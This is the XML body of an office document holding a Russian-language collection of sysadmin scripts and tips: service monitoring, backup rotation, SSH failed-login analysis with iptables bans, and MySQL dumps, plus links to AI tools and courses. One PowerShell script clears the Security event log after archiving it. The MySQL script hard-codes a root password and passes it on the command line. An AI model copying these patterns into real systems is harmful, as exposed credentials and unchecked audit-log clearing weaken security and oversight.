      <text:p text:style-name="P1"><text:span text:style-name="T5">if ! systemctl is-active --quiet "$SERVICE"; then</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>echo "$(date): $SERVICE не активен, пробую перезапустить..." &gt;&gt; /var/log/service_monitor.log</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>systemctl restart "$SERVICE"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">else</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>echo "$(date): $SERVICE работает нормально" &gt;&gt; /var/log/service_monitor.log</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">fi</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Можно добавить в крон, например, проверку каждые 5 минут: */5 * * * * /usr/local/bin/check_nginx.sh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Не забудь сделать скрипт исполняемым: chmod +x /usr/local/bin/check_nginx.sh</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Можно заменить nginx на любой другой системный сервис.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Что делает этот скрипт?</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">* who - выводит список всех вошедших пользователей.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">* grep 'pts' - фильтрует только те строки, что связаны с терминалами SSH.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">* awk '{print $1, $2, $5}' - красиво выводит имя пользователя, терминал и IP-адрес.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Пример вывода:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">admin pts/0 (192.168.1.55)</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T5">root <text:s/>pts/1 (10.0.0.23)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Порог в мегабайтах</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$logSizeThresholdMB = 1024</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Папка для архивации</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$archivePath = "D:\EventLogArchives"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">if (-not (Test-Path $archivePath)) {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>New-Item -Path $archivePath -ItemType Directory | Out-Null</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Функция для проверки и архивации логов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">function Archive-And-Clear-EventLog {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>param (</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/>[string]$LogName</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/># Определяем текущий размер лога</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>$logInfo = wevtutil gl $LogName</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>$fileSizeLine = ($logInfo | Where-Object { $_ -match "fileSize" })</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>$sizeBytes = [int64]($fileSizeLine -replace "[^0-9]", "")</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>$sizeMB = [math]::Round($sizeBytes / 1MB, 2)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>if ($sizeMB -ge $logSizeThresholdMB) {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/>$timestamp = (Get-Date).ToString("yyyyMMdd_HHmmss")</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/>$archiveFile = Join-Path $archivePath "$LogName`_$timestamp.evtx"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/># Экспортируем текущий журнал</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/>wevtutil epl $LogName $archiveFile</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/>Write-Host "Архивировал лог $LogName (размер $sizeMB MB) в $archiveFile"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/># Очищаем журнал</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/>wevtutil cl $LogName</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/>Write-Host "Очищен лог $LogName"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>} else {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="8"/>Write-Host "Лог $LogName в пределах нормы: $sizeMB MB"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>}</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5"># Получаем все журналы, которые хотим контролировать (пример: System и Security)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">$logsToCheck = @("System", "Security")</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">foreach ($log in $logsToCheck) {</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="4"/>Archive-And-Clear-EventLog -LogName $log</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">}</text:span></text:p>
      <text:p text:style-name="P15"><text:span text:style-name="T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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">#!/usr/bin/env bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># ================================</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Скрипт: backup_rotate.sh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Автор: https://t.me/bash_srv</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Описание: Создаёт архив указанной директории,</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># <text:s text:c="2"/>хранит только последние N бэкапов, удаляя старые.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># ================================</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Настройки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SOURCE_DIR="/var/www/my_project" <text:s text:c="5"/># Директория, которую резервируем</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">DEST_DIR="/backups/my_project" <text:s text:c="8"/># Директория для хранения бэкапов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">RETENTION_DAYS=7 <text:s text:c="22"/># Сколько дней хранить бэкапы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Текущее время для имени архива</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">DATE=$(date +"%Y-%m-%d_%H-%M-%S")</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">ARCHIVE_NAME="backup_${DATE}.tar.gz"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Проверяем, что исходная директория существует</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">if [[ ! -d "$SOURCE_DIR" ]]; then</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>echo " Исходная директория $SOURCE_DIR не найдена!"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>exit 1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">fi</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Создаём директорию назначения, если её нет</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">mkdir -p "$DEST_DIR"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Создаём архив</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">tar -czf "${DEST_DIR}/${ARCHIVE_NAME}" -C "$(dirname "$SOURCE_DIR")" "$(basename "$SOURCE_DIR")"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">if [[ $? -eq 0 ]]; then</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5"><text:s text:c="2"/>echo "Создан бэкап: ${DEST_DIR}/${ARCHIVE_NAME}"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">else</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>echo " Ошибка при создании архива!"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>exit 1</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">fi</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Удаляем старые бэкапы старше RETENTION_DAYS</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">find "$DEST_DIR" -type f -name "backup_*.tar.gz" -mtime +${RETENTION_DAYS} -print -delete</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">echo "Удалены бэкапы старше ${RETENTION_DAYS} дней."</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">exit 0</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">Пояснение к скрипту</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Настройки переменных:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">SOURCE_DIR - путь к директории, которую нужно сохранить (например, веб-проект, база данных и т.д.).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">DEST_DIR - куда складываем архива (может быть локальная папка или смонтированный удалённый диск).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">RETENTION_DAYS - сколько дней хранить бэкапы. Всё, что старше этого значения, будет удаляться автоматически.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Скрипт проверяет, существует ли исходная директория. Если нет - выводит ошибку и завершает работу.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Создаётся папка назначения (mkdir -p), чтобы избежать ошибок, если её ещё нет.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. Если архивирование прошло успешно (код возврата 0) - выводим сообщение об успехе.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">7. В конце скрипт выводит, сколько старых бэкапов удалено, и завершает работу.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как использовать:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Скопируйте скрипт в файл, например: sudo nano /usr/local/bin/backup_rotate.sh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Сделайте его исполняемым: sudo chmod +x /usr/local/bin/backup_rotate.sh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Отредактируйте переменные в начале скрипта под свои нужды:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>SOURCE_DIR="/path/to/your/data"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>DEST_DIR="/path/to/backup/location"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="3"/>RETENTION_DAYS=7</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Запустите вручную, чтобы протестировать: /usr/local/bin/backup_rotate.sh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. Если всё работает как надо, добавьте задание в ``````bash</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">crontab``````bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">для автоматического запуска. Например, чтобы делать бэкап каждый день в 3:00: sudo crontab -e</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">И добавить строку: 0 3 * * * /usr/local/bin/backup_rotate.sh &gt;&gt; /var/log/backup_rotate.log 2&gt;&amp;1</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">Здесь мы также перенаправляем вывод в лог-файл, чтобы отслеживать успешные и неуспешные запуски.</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. PlayHT (https://play.ht/) - студийное качество без студии. Есть готовые голоса и API. Часто используется в обучении и маркетинге.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Speechify (https://speechify.com/) - озвучит все: от PDF до веб-страниц. Простой, понятный и поддерживает десятки голосов.</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">5. LOVO (http://lovo.ai/) - заточен под рекламу и видео. Большая библиотека голосов, интеграции с видеоредакторами и поддержка эмоций.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">#!/usr/bin/env bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># ssh_fail_analyzer.sh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Анализ неудачных SSH-попыток и вывод TOP-10 IP</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">LOG_FILE="/var/log/auth.log" <text:s text:c="6"/># путь к логам (для CentOS: /var/log/secure)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">TOPN=10 <text:s text:c="27"/># сколько IP показывать</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">echo "Топ $TOPN IP с неудачными SSH-входами:"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">grep -E "Failed password for" "$LOG_FILE" \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>| grep -oP '(?&lt;=from )[\d\.]+' \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>| sort \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>| uniq -c \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>| sort -rn \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>| head -n "$TOPN"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как это работает:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. grep -E "Failed password for" - Ищем все строки с неудачными попытками.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T5">2. grep -oP '(?&lt;=from )\[\d.]+' - С помощью PCRE-регулярки достаём только IP-адреса после слова "from".</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. sort | uniq -c | sort -rn - Сортируем, считаем вхождения и выводим в порядке убывания.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. head -n "\$TOPN" - Ограничиваем результат топ-10.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Можно добавить в crontab ежедневный запуск и автоматическую отправку отчёта на почту или сразу бан «горячих» IP через iptables:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># в crontab: каждый день в 00:10</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">10 0 * * * /path/to/ssh_fail_analyzer.sh | mail -s "SSH Fail Report" admin@example.com</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Или сразу блокировать подозрительные IP, если они превысили порог:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">THRESHOLD=50</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">for ip in $(grep -E "Failed password for" "$LOG_FILE" \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="14"/>| grep -oP '(?&lt;=from )[\d\.]+' \</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="14"/>| sort | uniq -c \</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5"><text:s text:c="14"/>| awk -v t="$THRESHOLD" '$1 &gt; t {print $2}'); do</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5"><text:s text:c="2"/>iptables -I INPUT -s "$ip" -j DROP</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"><text:s text:c="2"/>echo "$(date): Заблокирован $ip за превышение $THRESHOLD неудачных попыток" &gt;&gt; /var/log/ssh_ban.log</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">done</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Если у тебя есть сервер с MySQL/MariaDB, автоматический бэкап с ротацией, то вот простой скрипт, который:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Делает дамп всех баз;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Сохраняет в архив с датой;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Удаляет архивы старше N дней:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">#!/bin/bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># автор: https://t.me/bash_srv</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Папка для бэкапов</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">BACKUP_DIR="/opt/backups/mysql"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Кол-во дней хранения</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">RETENTION_DAYS=7</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Дата для имени файла</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">DATE=$(date +'%Y-%m-%d_%H-%M')</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Учетные данные</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">DB_USER="root"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">DB_PASS="mypassword"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">mkdir -p "$BACKUP_DIR"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Делаем дамп</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">mysqldump -u"$DB_USER" -p"$DB_PASS" --all-databases | gzip &gt; "$BACKUP_DIR/mysql_backup_$DATE.sql.gz"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Удаляем старые бэкапы</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">find "$BACKUP_DIR" -type f -name "*.gz" -mtime +$RETENTION_DAYS -delete</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">echo "Бэкап MySQL завершён: $DATE"</text:span></text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T5">Рекомендуется повесить в крон, например, на каждый день в 3:00: 0 3 * * * /path/to/backup_mysql.sh</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Гарвард выкатил бесплатные курсы по AI и ML на 2025 год. Полный список доступных курсов:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">1. Введение в ИИ с Python - тут (https://www.edx.org/learn/artificial-intelligence/harvard-university-cs50-s-introduction-to-artificial-intelligence-with-python)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">2. Машинное обучение и ИИ с Python - тут (https://www.edx.org/learn/machine-learning/harvard-university-machine-learning-and-ai-with-python) </text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">3. Data Science: машинное обучение - тут (https://www.edx.org/learn/machine-learning/harvard-university-data-science-machine-learning)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">4. Data Science: капстоун-проект - тут (https://www.edx.org/learn/data-science/harvard-university-data-science-capstone)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">5. Анализ многомерных данных - тут (https://www.edx.org/learn/data-analysis/harvard-university-high-dimensional-data-analysis)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">6. Основы TinyML - тут (https://www.edx.org/learn/machine-learning/harvard-university-fundamentals-of-tinyml)</text:span></text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T5">7. Развертывание TinyML - тут (https://www.edx.org/learn/tinyml/harvard-university-deploying-tinyml)</text:span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T5">8. Применение TinyML - тут (https://www.edx.org/learn/tinyml/harvard-university-applications-of-tinyml)</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">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span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">#!/bin/bash</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Путь, в котором нужно очистить пустые папки</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">TARGET_DIR="/var/www/html"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5"># Удаляем все пустые директории, включая вложенные</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">find "$TARGET_DIR" -type d -empty -delete</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">echo "Все пустые директории удалены из $TARGET_DIR"</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Как это работает:</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">find ищет все папки (-type d), которые пусты (-empty) и удаляет их (-delete).</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Работает рекурсивно, удаляя даже вложенные пустые директории.</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T5">Можно запускать из cron раз в неделю, например: 0 3 * * 0 /opt/scripts/clean_empty_dirs.s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3"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aper-tray-name=""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06-26T21:24:41.028000000</dc:date>
    <meta:editing-duration>PT9M15S</meta:editing-duration>
    <meta:editing-cycles>1</meta:editing-cycles>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="183" meta:paragraph-count="4691" meta:word-count="51707" meta:character-count="387858" meta:non-whitespace-character-count="338020"/>
    <meta:user-defined meta:name="AppVersion">16.0000</meta:user-defined>
  </office:meta>
</office:document-meta>
</file>